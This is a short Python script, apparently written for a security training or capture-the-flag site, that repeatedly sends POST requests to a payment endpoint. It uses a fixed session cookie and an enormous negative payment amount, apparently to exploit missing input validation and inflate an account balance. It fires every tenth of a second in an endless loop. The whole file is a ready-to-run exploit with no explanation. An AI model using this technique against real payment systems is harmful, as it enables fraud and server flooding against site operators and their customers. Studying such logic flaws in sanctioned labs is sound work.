import requests
import time

while True:
	url = "http://202.cybertrial.co.uk/account-payment"

	payload = "pay_amount=-10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&pay_name=N.%20Null&pay_sortcode=10-20-20&pay_account=10001218&pay_reference=Food"
	headers = {
		'Content-Type': "application/x-www-form-urlencoded",
		'Cookie': "PHPSESSID=eo9qs1vp3shikcu24fjoogukma"
	}

	response = requests.request("POST", url, data=payload, headers=headers)

	print(response.text)
	time.sleep(0.1)